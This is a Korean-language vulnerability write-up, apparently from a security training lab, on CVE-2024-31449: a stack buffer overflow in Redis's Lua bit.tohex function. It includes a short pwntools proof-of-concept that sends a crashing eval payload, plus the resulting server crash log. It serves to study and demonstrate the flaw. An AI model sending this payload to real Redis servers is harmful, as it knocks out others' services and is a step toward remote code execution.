# CVE-2024-31449
Redis는 오픈 소스 인메모리 비관계형 데이터베이스이다.

## 요약
- Redis Lua 엔진이 포함된 모든 버전의 Redis에 존재하는 스택 버퍼 오버플로우 취약점
- Lua 엔진 내 bit.tohex 함수와 관련 (bit 모듈은 비트 연산을 수행하는데 사용됨)

bit.tohex 함수는 내부에서 음수가 들어오면 마이너스를 곱해서 양수처리함. INT32_MIN 값도 검사없이 음수 곱하고 진행해서 내부에서 엄청 큰 값으로 바뀐다음에 로직이 진행되어서 스택 버퍼 오버플로우가 발생하게 된다.

Redis 서버 바이너리는 거의 모든 보호기법이 걸려있기 떄문에 하나만으로는 RCE가 힘들지만 스택 버퍼 오버플로우로 DoS가 가능하다.

## PoC
```python
from pwn import *

p = remote("localhost",6379)

payload = f'eval "return bit.tohex(65535, -2147483648)" 0'.encode()

p.sendline(payload)

p.close()
```


PoC실행 후에 도커 로그를 보면 

```bash
------ CLIENT LIST OUTPUT ------
id=3 addr=172.22.0.1:40028 laddr=172.22.0.2:6379 fd=8 name= age=0 idle=0 flags=N db=0 sub=0 psub=0 ssub=0 multi=-1 qbuf=46 qbuf-free=20428 argv-mem=41 multi-mem=0 rbs=16384 rbp=16384 obl=0 oll=0 omem=0 tot-mem=37697 events=r cmd=eval user=default redir=-1 resp=2

------ CURRENT CLIENT INFO ------
id=3 addr=172.22.0.1:40028 laddr=172.22.0.2:6379 fd=8 name= age=0 idle=0 flags=N db=0 sub=0 psub=0 ssub=0 multi=-1 qbuf=46 qbuf-free=20428 argv-mem=41 multi-mem=0 rbs=16384 rbp=16384 obl=0 oll=0 omem=0 tot-mem=37697 events=r cmd=eval user=default redir=-1 resp=2
argv[0]: '"eval"'
argv[1]: '"return bit.tohex(65535, -2147483648)"'
argv[2]: '"0"'

------ MODULES INFO OUTPUT ------

------ CONFIG DEBUG OUTPUT ------
replica-read-only yes
slave-read-only yes
io-threads 1
io-threads-do-reads no
activedefrag no
repl-diskless-load disabled
lazyfree-lazy-eviction no
client-query-buffer-limit 1gb
list-compress-depth 0
sanitize-dump-payload no
lazyfree-lazy-user-flush no
lazyfree-lazy-user-del no
lazyfree-lazy-server-del no
proto-max-bulk-len 512mb
lazyfree-lazy-expire no
repl-diskless-sync yes

------ FAST MEMORY TEST ------
1:M 27 Apr 2025 13:37:28.332 # Bio thread for job type #0 terminated
1:M 27 Apr 2025 13:37:28.332 # Bio thread for job type #1 terminated
1:M 27 Apr 2025 13:37:28.333 # Bio thread for job type #2 terminated
*** Preparing to test memory region 55cb0da64000 (2301952 bytes)
*** Preparing to test memory region 55cb3d462000 (270336 bytes)
*** Preparing to test memory region 7fd7f17fd000 (8388608 bytes)
*** Preparing to test memory region 7fd7f1ffe000 (8388608 bytes)
*** Preparing to test memory region 7fd7f27ff000 (8388608 bytes)
*** Preparing to test memory region 7fd7f3000000 (8388608 bytes)
*** Preparing to test memory region 7fd7f3800000 (8388608 bytes)
*** Preparing to test memory region 7fd7f40f6000 (24576 bytes)
*** Preparing to test memory region 7fd7f42bd000 (16384 bytes)
*** Preparing to test memory region 7fd7f42df000 (16384 bytes)
*** Preparing to test memory region 7fd7f45d3000 (16384 bytes)
*** Preparing to test memory region 7fd7f47b4000 (8192 bytes)
*** Preparing to test memory region 7fd7f47e4000 (4096 bytes)
.O.O.O.O.O.O.O.O.O.O.O.O.O
Fast memory test PASSED, however your memory can still be broken. Please run a memory test for several hours if possible.

------ DUMPING CODE AROUND EIP ------
Symbol: (null) (base: (nil))
Module: redis-server *:6379 (base 0x55cb0d794000)
$ xxd -r -p /tmp/dump.hex /tmp/dump.bin
$ objdump --adjust-vma=(nil) -D -b binary -m i386:x86-64 /tmp/dump.bin
------

=== REDIS BUG REPORT END. Make sure to include from START to END. ===

       Please report the crash by opening an issue on github:

           http://github.com/redis/redis/issues

  If a Redis module was involved, please open in the module's repo instead.

  Suspect RAM error? Use redis-server --test-memory to verify it.

  Some other issues could be detected by redis-server --check-system
1:C 27 Apr 2025 13:37:30.234 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo
1:C 27 Apr 2025 13:37:30.234 # Redis version=7.0.4, bits=64, commit=00000000, modified=0, pid=1, just started
1:C 27 Apr 2025 13:37:30.234 # Configuration loaded
1:M 27 Apr 2025 13:37:30.234 * monotonic clock: POSIX clock_gettime
1:M 27 Apr 2025 13:37:30.235 * Running mode=standalone, port=6379.
1:M 27 Apr 2025 13:37:30.235 # Server initialized
1:M 27 Apr 2025 13:37:30.235 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.
1:M 27 Apr 2025 13:37:30.236 * Loading RDB produced by version 7.0.4
1:M 27 Apr 2025 13:37:30.236 * RDB age 990 seconds
1:M 27 Apr 2025 13:37:30.236 * RDB memory usage when created 0.82 Mb
1:M 27 Apr 2025 13:37:30.236 * Done loading RDB, keys loaded: 0, keys expired: 0.
1:M 27 Apr 2025 13:37:30.236 * DB loaded from disk: 0.000 seconds
1:M 27 Apr 2025 13:37:30.236 * Ready to accept connections

# root @ daeseong in /mnt/p/WHS/docker/CVE-2024-31449 0 [22:37:37]
~
```


크래시가 발생한것을 볼 수 있다.

## 정리
이 취약점을 통해 적으면 DoS, 정보유출(info leak)까지 동반된다면 RCE까지 가능하다.
